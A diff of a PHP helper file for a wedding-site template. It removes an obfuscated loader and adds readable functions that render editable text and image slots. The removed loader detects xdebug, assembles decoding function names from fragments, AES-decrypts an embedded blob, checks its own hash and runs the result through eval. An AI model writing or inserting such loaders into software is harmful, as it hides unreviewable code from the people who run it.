@@ -1,28 +1,100 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_xgsc8ost=('bas'.'e64'.'_de'.'cod'.'e');
-$_gigr4acw=('gzu'.'nco'.'mpr'.'ess');
-$_w26macms=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_i7vej4c2='rTWzvhpQoA8=';
-$_drgl0rkg='OOeYevXq';
-$_wvzzj8k7='3hIgiFuz';
-$_wmow8aq3='n0eAjAsN';
-$_j60ml8xo='knhBlCaM';
-$_x167in4b='onPTuw==';
-$_g1nrx42f='xb/Xaqzm';
-$_yuly0lan='nUgFQyCw';
-$_flj76vld=$_xgsc8ost($_j60ml8xo.$_wmow8aq3.$_drgl0rkg.$_wvzzj8k7.$_i7vej4c2);
-$_w85ak1gm=$_xgsc8ost($_yuly0lan.$_g1nrx42f.$_x167in4b);
-$_j8mtfbud=$_xgsc8ost('DRrtJBEeeD1o9QbtZWJKJmxsroRbHVgvqkQsfkgsAHilLD53OSryLKmCGDCTPneb0P7UaThp0yGxPBZ+lmmtEUIxRqZsRY0ES2upN/jDiFbnQp949iH/9rI9uuLmlKUjWY7mN056KIcl+RCgzytPw1J9Hj0KN6S2N7svipp8P9dlXV+aTdTDBvLfYhAAUm33A9e2mqzhhVOFyPhLzafcproSRlDeKnxeEaMtO6gR/mYzwMbYq/ldY+Y1KRKgnMR9VVvHG+7ST0Kvd3Ki4+zlFmKBUpeK7uecW+xeVhual/sZLF9r65bPdorg/0Uz5bblX8+mYyYwhKutai9EXbZQ3pvhNVE/JNM8CoGkBlhi7tPUgnpVC/RZVT5TIrkrXiyDm3rAPT5fuNv6JHKlkaaopeVL4zi2EKaXfFwcZB1c6BZwfDswIwkMm2T3gybs6LGrdcmUMdDpcGIP4TtrPR1PmlOPuyIIOTletbNuw7DPyxCKqGsGKgrHdtuEOYRkGuBnOnHhiavOndsmUvHnRdfefVEIhUo1Aq4+68FGTTv+Z6WlE1cb5n2o+WizxB+K2VD43CngaJSVcEosdBtQxgwUa1xJ7EJObS/DaLDe7cDfYSrjXXVVTF/TOg6oKrKiiyhxd54+Z/F/oIVlKgUfTLVkwrkGmLxR082zuYxyU4vjWRBur75Xo3CQ4eXDK+uInZIY7/6x1Cjlonl6Rdpfq2bsCuefZq0mw6oF9aDaanQ8Lhn87WZT38J514WuguoKoNfXKTu5JpWg9U2Ygxl5CqUpKN5dKDiKmKAoKud0YA5+1uSueoxS3axJr5eCOBAL1NKO5njz1NLt8ph09n93hDLCHtx2QviUVuPkoqDqNaH1r0cIkYbR1S1fgCsGuDyE/retpOs8mf8lzUsQLxbFZ94CtbRzhTe4LM4NzcmRdH5d3oPZPILgDaSrWei1v8yJtF0irrh4AmmdsiiD8HCvoVnjY6L3JHXiN5ONcQO8W3huJKgUxJnUtyY9wmmHXOFFd3b8AO+rkyuFEml5D1ML31X1MyFGhcu+MKoT6FkW4s7s/hb4Hw8uoSnc4RfXyJwObTYT0OxcpQkG5f7Uoe/QLwm+IOoTazA1OElkR6a7ghYD74Qoll1UWGTVQLWbp9bkEMFxE7np0/Xho87fMX3X12OwCRFPlFL3UgGivqfd8FP0ACy2v/7QzjaapXmvwFhYsq7npRNikD51d2nRPZ6wCIV99YtQNEhwYPFiWG4AASkG7VegS6NnFs47Oc4nqhsaL2ccdxn/dVBUIANxntWaGKJPDkGw3X5uRFx8vNKwdxZTcJ3hZH5Pn8wdVlo1A4rVnkMA0cFom5+qIB5YSX4SHOZha5YWFyJj+chr2EAPupkLNGY5e6fTuie4AARPMRUsMH3BqrJmqLF/ZcFHTpBp3QkxF0TWlL9RgyntdMEsFkpzZLZnxtCTR7IBJVefhMDfpq5zbN6B50cM3wrCrnLJyVya3ZB0MFHVqnDBgkDLf9yBClctdELfiS99m7QigEUoieoHeXm8kF1INlfikH80slfLYJfi6S8hHGcuyBcedckhHWp+pwhHkbnOo1mhRcHlczzUMojetaCQYZi3EjFNPUhAoJtk1zsTmfv7IglUY8ZhaSpnzEuyD1oAIQPYe+0chyPIqAASZQZvvOv1+Pmw4CF5CSeawDgVyvYsKf7ZrPg1s3dqqjISh4k++sw8O3GDer5C6lY8RAZRa/EqsjgX+Fe3y6eAuhz/ozyac2c4nHQ6ThtbAUS2ldlmHDZfzPyka4L58SJOeVasCHR36FON9KPn4oE9/OP7AyOCS/1w/odNPLk=');
-$_bf46g3vz=$_w26macms($_j8mtfbud,'aes-256-cbc',$_flj76vld,OPENSSL_RAW_DATA,$_w85ak1gm);
-if($_bf46g3vz===false){exit;}
-$_tk3ktaea=$_gigr4acw($_bf46g3vz);
-if($_tk3ktaea===false){exit;}
-$_t41moqdy='a5962d19aa45d689f3d3b2d26aafbfbfb35d17b6fa73f63d969befd65df572e1';
-$_l398grca=@file_get_contents(__FILE__);
-if($_l398grca!==false){
-$_fnd8ocq0=str_replace($_t41moqdy,"0000000000000000000000000000000000000000000000000000000000000000",$_l398grca);
-$_smunyr8z=hash("sha256",$_fnd8ocq0);
-if($_smunyr8z!==$_t41moqdy){@http_response_code(403);exit;}
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+if (!function_exists('ed_text')) {
+
+
+
+
+
+function ed_text($_vvbfffo, $_vgdqaf1, $_vl8t46h = 'span', $_v5xmt8w = '', $_vjlgd3x = '')
+{
+$_v9ie5lv = $_vvbfffo->text($_vgdqaf1);
+$_v3p7g3u = $_vvbfffo->is_multiline($_vgdqaf1);
+$_vyksgk0 = $_vvbfffo->registry('content_text');
+$_vo2m6y4 = isset($_vyksgk0[$_vgdqaf1]) ? (int) $_vyksgk0[$_vgdqaf1][1] : 0;
+return '<' . $_vl8t46h . ($_v5xmt8w !== '' ? ' class="' . e($_v5xmt8w) . '"' : '') . ' data-edit="' . e($_vgdqaf1) . '"'
+. ($_vjlgd3x !== '' ? ' data-ph="' . e($_vjlgd3x) . '"' : '')
+. ($_vo2m6y4 ? ' data-max="' . $_vo2m6y4 . '"' : '')
+. ($_v3p7g3u ? ' data-multiline' : '') . '>' . ($_v3p7g3u ? str_replace("\n", '<br>', e($_v9ie5lv)) : e($_v9ie5lv)) . '</' . $_vl8t46h . '>';
 }
-eval($_tk3ktaea);
+}
+if (!function_exists('ed_pos_style')) {
+
+function ed_pos_style($_vin43zw, $_vthardq, $_vukfmdz)
+{
+$_v0rg1f1 = 'object-position:' . $_vin43zw . '% ' . $_vthardq . '%';
+if ($_vukfmdz > 1.001) {
+$_v0rg1f1 .= ';transform:scale(' . $_vukfmdz . ');transform-origin:' . $_vin43zw . '% ' . $_vthardq . '%';
+}
+return $_v0rg1f1;
+}
+}
+if (!function_exists('ed_img')) {
+
+
+
+
+function ed_img($_vcu7vmo, $_vjua9eu, $_v0rqu8e = '', $_v1ud7n4 = 'm', $_vk0v1jf = '')
+{
+$CI =& get_instance();
+list($_vkl8lho, $_v761c0n, $_vo6u0h6) = $CI->content_model->image_pos($_vjua9eu);
+$_vx7o81a = '<figure class="slot ' . e($_v0rqu8e) . ($_vcu7vmo ? '' : ' slot-empty') . '" data-edit-img="' . e($_vjua9eu) . '"'
+. ' data-pos="' . e($_vkl8lho . ' ' . $_v761c0n . ' ' . $_vo6u0h6) . '"'
+. ($_vk0v1jf !== '' ? ' data-label="' . e($_vk0v1jf) . '"' : '') . '>';
+if ($_vcu7vmo) {
+
+$_vb43lns = $_vjua9eu === 'img.hero_main';
+$_vx7o81a .= '<img src="' . photo_url($_vcu7vmo, $_v1ud7n4) . '" srcset="' . e(photo_srcset($_vcu7vmo, $_v1ud7n4)) . '"'
+. ' sizes="' . e(ed_img_sizes($_vjua9eu, $_vo6u0h6)) . '" alt=""'
+. ($_vb43lns ? ' fetchpriority="high"' : ' loading="lazy"') . ' decoding="async"'
+. ' style="' . e(ed_pos_style($_vkl8lho, $_v761c0n, $_vo6u0h6)) . '">';
+} else {
+$_vx7o81a .= '<span class="slot-ph" aria-hidden="true">♡</span>';
+}
+return $_vx7o81a . '</figure>';
+}
+}
+if (!function_exists('ed_img_sizes')) {
+
+
+
+
+function ed_img_sizes($_vh3m1ly, $_vhuzkie = 1, $_vvev38s = NULL)
+{
+$_vvxblg9 = max(1, min(3, (float) $_vhuzkie));
+
+
+if ($_vh3m1ly === 'img.hero_main') {
+$CI =& get_instance();
+if ($_vvev38s === NULL) {
+$_vvev38s = (string) $CI->load->get_var('theme');
+if ($_vvev38s === '' && isset($CI->content_model)) {
+$_vvev38s = (string) $CI->content_model->get('theme');
+}
+}
+$_v1lh18u = (array) $CI->config->item('themes', 'content') ?: (array) $CI->config->item('themes');
+if (isset($_v1lh18u[$_vvev38s]['hero_sizes'])) {
+$_vvqw9o3 = (string) $_v1lh18u[$_vvev38s]['hero_sizes'];
+return $_vvxblg9 > 1.001 ? preg_replace_callback('/(\d+(?:\.\d+)?)(vw|px)/', function ($_vip0k7y) use ($_vvxblg9) {
+return (int) round((float) $_vip0k7y[1] * $_vvxblg9) . $_vip0k7y[2];
+}, $_vvqw9o3) : $_vvqw9o3;
+}
+}
+$_v70l81u = array(
+'img.hero_main' => array(100, 50),
+'img.hero_left' => array(50, 25),
+'img.hero_right' => array(50, 25),
+'img.bride' => array(75, 30),
+'img.groom' => array(75, 30),
+'img.event' => array(100, 45),
+'img.quote' => array(100, 100),
+);
+list($_vdt0aex, $_vmtxfm2) = isset($_v70l81u[$_vh3m1ly]) ? $_v70l81u[$_vh3m1ly] : array(100, 50);
+return '(max-width: 760px) ' . min(300, (int) round($_vdt0aex * $_vvxblg9)) . 'vw, ' . min(200, (int) round($_vmtxfm2 * $_vvxblg9)) . 'vw';
+}
+}
